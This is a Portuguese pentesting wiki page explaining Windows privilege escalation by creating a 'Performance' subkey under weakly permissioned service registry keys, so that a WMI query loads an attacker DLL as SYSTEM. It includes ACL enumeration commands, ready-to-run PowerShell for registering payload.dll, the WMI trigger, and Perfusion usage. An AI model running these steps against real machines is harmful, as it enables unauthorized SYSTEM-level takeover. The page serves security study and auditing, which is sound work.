# Permissão de AppendData/AddSubdirectory sobre o Registro de Serviços

{{#include ../../banners/hacktricks-training.md}}

**A publicação original está em** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Resumo

Se você tiver apenas **`Create Subkey`** / **`AppendData/AddSubdirectory`** em uma chave de registro de serviço, isso ainda é uma boa oportunidade de privesc. Normalmente, você **não pode** sobrescrever diretamente `ImagePath`, `ServiceDll` ou outros valores existentes, mas ainda poderá criar uma chave filha **`Performance`** em:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Qualquer outra chave **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** na qual seu token tenha **`KEY_CREATE_SUB_KEY`**

O truque é que o Windows ainda oferece suporte ao modelo de registro legado **PerfLib V1**. Se um serviço tiver uma subchave **`Performance`**, o Windows poderá carregar uma DLL a partir dela quando um consumidor de contadores de desempenho solicitar dados.

De acordo com a documentação da Microsoft, o registro mínimo é:<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Portanto, a conclusão ofensiva é: **não descarte uma descoberta no registro de um serviço apenas porque você obteve `CreateSubKey` em vez de `SetValue`**.<sup>[[3]](#references)</sup>

## Por que isso é suficiente para execução de código

A subchave `Performance` normalmente **não existe por padrão nesses serviços**, portanto **`KEY_CREATE_SUB_KEY`** é a primitiva necessária. Assim que a chave existe e contém `Library`/`Open`/`Collect`/`Close`, qualquer **consumidor de contadores de desempenho** pode acionar o carregamento da DLL.<sup>[[3]](#references)</sup>

Alguns detalhes importantes:

- O valor **`Library`** pode apontar para um **caminho completo de DLL**.
- A DLL deve exportar **`OpenPerfData`**, **`CollectPerfData`** e **`ClosePerfData`** e retornar `ERROR_SUCCESS`.
- O código é executado no **contexto do consumidor**, **não necessariamente no próprio processo do serviço vulnerável**.
- No caso clássico de `RpcEptMapper` / `Dnscache`, uma **consulta de desempenho do WMI** pode fazer com que **`wmiprvse.exe`** carregue a DLL como **`NT AUTHORITY\SYSTEM`**.

É por isso que essa primitiva pode passar despercebida durante a triagem: a chave do serviço pai não é "totalmente gravável", mas ainda pode ser weaponized.

## Enumeração rápida

Verificação manual pontual com **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Exemplo de PowerShell para procurar entidades com poucos privilégios que tenham **`CreateSubKey`** nas chaves de serviços:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Ferramentas úteis:

- **PrivescCheck**: `Get-ModifiableRegistryPath` foi criado especificamente para identificar esta classe de problema.<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: automatiza o DLL drop, o registro de `Performance`, o gatilho WMI, a duplicação de token e a limpeza em targets legados vulneráveis (por exemplo: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>

## Fluxo de exploração

Crie a subchave `Performance` e preencha os valores necessários:<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Em seguida, acione um consumidor de desempenho **privilegiado**. Um exemplo clássico é uma consulta WMI sobre as classes `Win32_Perf*`:<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Notas operacionais:

- Iniciar **`perfmon.exe`** é útil para verificar se o registro do contador está correto, mas isso normalmente apenas carrega a DLL no contexto do **seu próprio usuário**.
- Para um LPE real, acione um consumidor **privilegiado**, como o **WMI**.
- Se você estiver escrevendo seu próprio exploit, iniciar `cmd.exe` diretamente de dentro da DLL normalmente deixará você com um shell na **session 0**. O `Perfusion` resolve isso duplicando o token privilegiado em um processo criado suspenso na session do atacante.<sup>[[4]](#references)</sup>
- Combine a arquitetura da DLL com a do consumidor-alvo (**x64 em sistemas x64**).

## Notas sobre versões / desenvolvimentos recentes

Historicamente, as chaves fracas integradas eram:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` e `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

O `Perfusion` observa que as atualizações de **abril de 2021** removeram o caminho fácil de exploração em sistemas **Windows 8 / Windows Server 2012** atualizados, enquanto o **Windows 7 / Windows Server 2008 R2** continuou explorável por meio do **`Dnscache`**.<sup>[[4]](#references)</sup>

Essa primitiva **não é apenas histórica**. Em **janeiro de 2025**, a Microsoft corrigiu um problema relacionado do AD DS no qual membros de **`Network Configuration Operators`** podiam criar subchaves em **`Dnscache`** e **`NetBT`**, e a mesma ideia de **registro de DLL de contador de desempenho** poderia ser reutilizada para alcançar **SYSTEM** em sistemas compatíveis.<sup>[[2]](#references)</sup>

Portanto, a lição moderna é genérica: sempre que um principal com poucos privilégios tiver **`CreateSubKey`** em **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, verifique se uma chave filha **`Performance`** é suficiente antes de descartar a descoberta.

## Referências

- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
